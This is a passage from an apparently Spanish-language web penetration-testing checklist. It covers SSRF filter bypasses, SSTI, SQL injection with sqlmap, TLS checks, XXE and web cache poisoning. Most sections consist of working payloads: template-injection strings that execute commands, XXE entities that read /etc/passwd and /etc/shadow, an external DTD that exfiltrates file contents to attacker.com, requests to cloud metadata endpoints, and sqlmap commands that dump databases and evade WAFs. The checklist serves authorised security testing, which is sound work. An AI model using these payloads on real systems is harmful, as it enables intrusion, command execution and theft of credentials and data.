* [ ] Monitorizar el panel de Burp Collaborator para recibir interacciones DNS/HTTP que confirmen el SSRF.
* [ ] Probar también con `file://` para leer ficheros locales si el esquema está permitido:

```
url=file:///etc/passwd
url=file:///C:/windows/win.ini
```



### 6. SSRF con bypass de filtro blacklist

* [ ] Si la aplicación bloquea `localhost` o `127.0.0.1`, probar representaciones alternativas:

```
http://127.1
http://2130706433          # Decimal
http://0177.0.0.1          # Octal
http://0x7f000001          # Hex
http://127.0.0.1.nip.io    # DNS que resuelve a 127.0.0.1
http://localtest.me        # DNS que resuelve a 127.0.0.1
http://[::1]               # IPv6 loopback
http://[::]                # IPv6
```

* [ ] Probar doble encoding de caracteres bloqueados:

```
http://%31%32%37%2e%30%2e%30%2e%31/admin    # 127.0.0.1 en URL encoding
http://127%2e0%2e0%2e1/admin
```

* [ ] Usar redirección abierta (open redirect) para evadir la blacklist — si la aplicación sigue redirecciones:

```
url=https://target.com/redirect?url=http://127.0.0.1/admin
```



### 7. SSRF con bypass de filtro whitelist

* [ ] Si la aplicación solo acepta URLs de dominios en una whitelist, probar técnicas de bypass:

```
# @ para inyectar credenciales antes del dominio permitido
https://allowed-domain.com@evil.com

# Subdominio del dominio permitido
https://evil.allowed-domain.com

# Dominio permitido como parámetro
https://evil.com/?allowed-domain.com

# Fragmento
https://evil.com/#allowed-domain.com
```

* [ ] Encadenar con un open redirect en el dominio permitido para apuntar a destinos internos:

```
url=https://allowed-domain.com/redirect?to=http://169.254.169.254/
```



### 8. SSRF embebido en formatos de datos

* [ ] Verificar SSRF embebido en XML procesado por el servidor (XXE → SSRF):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&ssrf;</root>
```

* [ ] Si la aplicación genera PDFs o imágenes a partir de HTML controlable, inyectar tags que fuercen peticiones del servidor:

```html
<img src="http://169.254.169.254/latest/meta-data/">
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

* [ ] Verificar SSRF en SVG subidos al servidor:

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

***

## 🧩 SSTI

### 1. Identificación de puntos de entrada

* [ ] Identificar campos cuyo valor se renderiza a través de un motor de plantillas:
  * Mensajes de error personalizados
  * Campos de nombre de usuario o perfil que aparecen en la respuesta
  * Parámetros de URL reflejados en la página
  * Asunto o cuerpo de emails generados por la aplicación
  * Campos de búsqueda o filtros que se muestran en la respuesta



### 2. Payload de detección universal

* [ ] Probar los siguientes payloads en todos los puntos de entrada identificados — cada motor interpreta la sintaxis de forma diferente:

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
```

* [ ] Si la respuesta devuelve `49` o `7777777` en lugar del valor literal, hay inyección de plantilla confirmada.



### 3. Identificación del motor de plantillas

Usar el resultado de los payloads anteriores para identificar el motor:

```
{{7*7}}    → 49         → Jinja2 (Python) / Twig (PHP)
{{7*'7'}}  → 49         → Jinja2
{{7*'7'}}  → 7777777    → Twig
${7*7}     → 49         → Freemarker / Smarty / Thymeleaf
<%= 7*7 %> → 49         → ERB (Ruby)
#{7*7}     → 49         → Ruby (Slim / Haml)
*{7*7}     → 49         → Thymeleaf (Spring)
```



### 4. Escalada a RCE

Una vez identificado el motor, probar ejecución de comandos:


```python
# Jinja2 (Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP)
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby)
<%= system("id") %>
<%= `id` %>

# Smarty (PHP)
{php}echo `id`;{/php}
```


> 💡 **Herramienta:** [**tplmap**](https://github.com/epinna/tplmap) automatiza la detección y explotación de SSTI en múltiples motores de plantillas.

***

## 💉 SQL Injection

### Nota sobre detección y explotación automática

La detección de SQL Injection está cubierta por **Acunetix** como parte del proceso estándar de auditoría. La explotación se realiza principalmente con **sqlmap**. Esta sección se centra en la **detección manual** — los casos donde las herramientas automáticas tienen puntos ciegos — y en el uso correcto de sqlmap.



### 1. Dónde buscar

* [ ] No limitar la búsqueda a parámetros GET/POST visibles. Verificar también en:
  * **Cookies** — valores que el servidor procese en queries
  * **Cabeceras HTTP** — `User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`
  * **Campos de ordenación y paginación** — `ORDER BY`, `LIMIT`, `offset=`
  * **Campos de búsqueda** — filtros, autocompletado, búsqueda avanzada
  * **Parámetros de API REST** — IDs en rutas, filtros en query string
  * **Campos ocultos de formularios**



### 2. Detección manual

* [ ] Inyectar caracteres que puedan romper la query SQL y observar diferencias en la respuesta:

```sql
'
''
"
;
-- -
#
/*comment*/
`
```

* [ ] Observar si la respuesta muestra errores de base de datos, comportamiento diferente o cambios en el contenido — cualquier diferencia es indicador de inyección.
* [ ] Probar condiciones booleanas para detectar blind SQLi:

```sql
# Si el parámetro es id=1, probar:
1 AND 1=1    → respuesta normal
1 AND 1=2    → respuesta diferente → blind SQLi confirmado

# En parámetros de string:
' AND '1'='1
' AND '1'='2
```

* [ ] Probar time-based para confirmar blind SQLi cuando no hay diferencia en la respuesta:

```sql
# MySQL
1' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--   # MSSQL
1' AND pg_sleep(5)--          # PostgreSQL
```



### 4. Second-Order SQL Injection

* [ ] Identificar flujos donde un valor introducido por el usuario se almacena y posteriormente se usa en una query SQL en otro contexto (ej. cambio de contraseña, actualización de perfil).
* [ ] Registrar una cuenta con un nombre de usuario que contenga payload SQL:

```sql
admin'--
' OR 1=1--
admin' AND '1'='1
```

* [ ] Realizar la acción secundaria (ej. cambiar contraseña) y verificar si el payload almacenado se ejecuta en ese contexto.

> 💡 **Nota:** Acunetix no detecta Second-Order SQLi de forma fiable — esta prueba debe realizarse siempre manualmente.



### 5. Explotación con sqlmap

* [ ] Detección básica sobre un parámetro GET:

```bash
sqlmap -u "https://target.com/item?id=1" --batch
```

* [ ] Detección sobre petición POST (exportar desde Burp y pasar el fichero):

```bash
sqlmap -r request.txt --batch
```

* [ ] Enumerar bases de datos, tablas y extraer datos:

```bash
# Enumerar bases de datos
sqlmap -u "https://target.com/item?id=1" --dbs --batch

# Enumerar tablas de una base de datos
sqlmap -u "https://target.com/item?id=1" -D nombre_db --tables --batch

# Extraer datos de una tabla
sqlmap -u "https://target.com/item?id=1" -D nombre_db -T nombre_tabla --dump --batch
```

* [ ] Bypass de WAF — probar con técnicas de tamper:

```bash
sqlmap -u "https://target.com/item?id=1" --tamper=space2comment --batch
sqlmap -u "https://target.com/item?id=1" --tamper=between,randomcase --batch
sqlmap -u "https://target.com/item?id=1" --random-agent --level=5 --risk=3 --batch
```

* [ ] Probar en cookies y cabeceras:

```bash
# Cookie
sqlmap -u "https://target.com/" --cookie="session=abc123" -p session --batch

# Cabecera User-Agent
sqlmap -u "https://target.com/" --headers="User-Agent: *" --batch
```

***

## 🔒 Transmisión Segura

### 1. Análisis de la configuración SSL/TLS

* [ ] Ejecutar **testssl.sh** contra el target para obtener un análisis completo de la configuración SSL/TLS:

```bash
testssl.sh https://target.com
testssl.sh --full https://target.com
```

* [ ] Verificar las **categorías de cifrado** — testssl clasifica los cipher suites en categorías (OK, WEAK, INSECURE) y reporta el resultado global.
* [ ] Identificar y documentar las **suites de cifrado inseguras** activas:
  * Cipher suites con RC4, DES, 3DES, NULL, EXPORT, anon
  * Cipher suites con longitud de clave inferior a 128 bits
  * Cipher suites sin Forward Secrecy (sin ECDHE o DHE)
* [ ] Verificar que **TLS 1.0 y TLS 1.1** están desactivados — solo TLS 1.2 y TLS 1.3 deberían estar activos.
* [ ] Verificar que **SSLv2 y SSLv3** están completamente desactivados.



### 2. Transmisión de información sensible

* [ ] Verificar que las credenciales de usuario (usuario y contraseña) se transmiten únicamente a través de HTTPS — nunca en claro por HTTP.
* [ ] Verificar que los tokens de sesión, tokens JWT y cookies de autenticación se transmiten únicamente por HTTPS.
* [ ] Verificar que cualquier información sensible (datos personales, datos de pago, tokens de API) se entrega exclusivamente a través de HTTPS.
* [ ] Comprobar que la aplicación no transmite información sensible en la URL como query parameter — las URLs pueden quedar registradas en logs de servidores, proxies y el historial del navegador.

***

## 📄 XXE

### 1. Identificación de puntos de entrada

* [ ] Identificar dónde la aplicación procesa XML:
  * Peticiones SOAP y endpoints que acepten `Content-Type: application/xml` o `text/xml`
  * Ficheros subidos: DOCX, XLSX, PPTX, SVG, PDF
  * Imports de datos y funcionalidades de carga masiva
  * Endpoints que procesen feeds RSS/Atom
* [ ] Verificar si el parser acepta la declaración DOCTYPE enviando un XML básico con DOCTYPE vacío — si no devuelve error, el parser es potencialmente vulnerable.

```xml
<?xml version="1.0"?>
<!DOCTYPE test []>
<root>test</root>
```



### 2. XXE via Content-Type switching

* [ ] Si un endpoint acepta JSON, probar cambiar `Content-Type: application/json` a `application/xml` y enviar payload XML — algunos backends tienen parsers XML internos que procesan ambos formatos:

```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```



### 3. XXE con entidades externas

* [ ] Verificar si el parser procesa entidades externas y devuelve su contenido en la respuesta:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

* [ ] Probar con otros ficheros sensibles según el OS:

```xml
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
```



### 4. XXE para ataques SSRF

* [ ] Usar XXE para forzar peticiones del servidor a recursos internos:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

* [ ] Probar acceso a servicios internos:

```xml
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://192.168.0.1/">
```



### 5. XXE Blind — Interacción OOB

* [ ] Si no hay respuesta visible, confirmar la vulnerabilidad mediante interacción out-of-band con Burp Collaborator o interactsh:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://collaborator-id.oastify.com">]>
<root><data>&xxe;</data></root>
```



### 6. XXE Blind — Parameter Entities

* [ ] Usar parameter entities (con `%`) para explotación en contextos donde las entity references normales no funcionan:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://collaborator-id.oastify.com">
  %xxe;
]>
<root>test</root>
```



### 7. XXE Blind — Exfiltración via DTD externa

* [ ] Alojar un fichero DTD malicioso en un servidor controlado y usarlo para exfiltrar ficheros del servidor objetivo:

**Fichero DTD en servidor del atacante (**[**https://attacker.com/evil.dtd**](https://attacker.com/evil.dtd)**):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload enviado a la aplicación:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd"> %xxe;]>
<root>test</root>
```



### 8. XXE Blind — Mensajes de error

* [ ] Si el parser muestra mensajes de error, forzar que el error incluya el contenido del fichero objetivo:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```



### 9. XInclude para leer archivos

* [ ] Si no es posible controlar el DOCTYPE, probar XInclude — funciona dentro del cuerpo del documento sin necesidad de modificar el DTD:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

* [ ] Útil cuando solo se controla parte del XML (ej. un valor dentro de un tag) y no la estructura completa.



### 10. XXE via SVG

* [ ] Si la aplicación permite subir imágenes SVG, inyectar XXE en el contenido SVG:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```



### 11. XXE usando DTD local

* [ ] Si las DTD externas están bloqueadas, buscar un DTD local en el servidor que pueda ser reutilizado para redefinir entidades y exfiltrar datos:


```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root>test</root>
```


> 💡 **Tip:** DTDs locales comunes en sistemas Linux: `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`, `/etc/xml/docbook-xml`.

***

## 💀 Web Cache Poisoning

### 1. Detección del sistema de caché

* [ ] Verificar si la aplicación usa un sistema de caché analizando las cabeceras de respuesta:

```http
X-Cache: HIT / MISS
CF-Cache-Status: HIT / MISS   # Cloudflare
Age: 120                       # Segundos desde que la respuesta fue cacheada
Via: 1.1 varnish               # Indica Varnish
X-Varnish: 12345
X-Cache-Hits: 1
```

* [ ] Si `X-Cache: HIT` aparece en peticiones repetidas, hay caché activa y la aplicación es candidata a WCP.
* [ ] Verificar el comportamiento de la caché añadiendo un parámetro único (cache buster) para asegurarse de obtener siempre una respuesta fresca:

```
GET /page?cb=12345 HTTP/1.1
```



### 2. Identificación de claves de caché (cache keys)

* [ ] Identificar qué parámetros forman parte de la cache key (son considerados por la caché para distinguir respuestas) y cuáles no.
* [ ] Usar el plugin **Param Miner** de Burp Suite para descubrir automáticamente cabeceras y parámetros no indexados en la cache key:
  * `Extensions → Param Miner → Guess headers`
  * `Extensions → Param Miner → Guess params`
* [ ] Verificar si cabeceras de uso común (`X-Forwarded-Host`, `X-Forwarded-For`, `X-Original-URL`) están excluidas de la cache key pero afectan a la respuesta.



### 3. WCP con cabecera no indexada

* [ ] Identificar una cabecera que no forme parte de la cache key pero cuyo valor se refleje en la respuesta (ej. `X-Forwarded-Host`).
* [ ] Inyectar un valor malicioso en la cabecera y verificar si la respuesta envenenada queda almacenada en caché:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```

* [ ] Si la respuesta incluye el valor de la cabecera (ej. en una URL de recurso JS) y aparece `X-Cache: HIT` en la siguiente petición sin la cabecera, el envenenamiento fue exitoso.



### 4. WCP con cookie no indexada

* [ ] Identificar cookies que no formen parte de la cache key pero cuyo valor se refleje en la respuesta.
* [ ] Inyectar un payload en el valor de la cookie y verificar si la respuesta envenenada queda cacheada:

```http
GET / HTTP/1.1
Host: target.com
Cookie: lang=es"><script>alert(1)</script>
```

* [ ] Comprobar que una petición posterior sin la cookie obtiene la respuesta envenenada desde caché.



### 5. WCP con múltiples cabeceras HTTP

* [ ] Verificar si la combinación de varias cabeceras no indexadas produce el efecto deseado cuando ninguna por separado lo consigue:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
```

* [ ] Probar combinaciones de cabeceras que conjuntamente fuercen una redirección o carga de recurso externo.



### 6. WCP con cabecera desconocida

* [ ] Usar Param Miner para descubrir cabeceras personalizadas o no documentadas que el backend procese y reflejen en la respuesta.
* [ ] Probar cabeceras menos conocidas que algunos frameworks procesan:

```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
```



### 7. WCP mediante Parameter Cloaking

* [ ] Explotar inconsistencias entre cómo el servidor de caché y el servidor de aplicación parsean los query parameters.
* [ ] Probar separadores alternativos que la caché ignora pero el backend procesa:

```
# La caché ve: ?param=value
# El backend ve: ?param=value&utm_content=xxx;injected=payload
GET /path?param=value&utm_content=xxx;injected=payload HTTP/1.1
```

* [ ] Probar con punto y coma como separador de parámetros (usado en algunos frameworks Ruby/PHP):

```
GET /path?utm_content=x;param=payload HTTP/1.1
```



### 8. WCP mediante Fat GET Request

* [ ] Verificar si el servidor acepta un body en peticiones GET y lo procesa como parámetros adicionales, mientras la caché solo considera la URL:

```http
GET /?param=legit HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

param=evil_payload_here
```

* [ ] Si el servidor usa el valor del body y la caché clave solo por la URL, la respuesta envenenada quedará servida a todos los usuarios que soliciten esa URL.
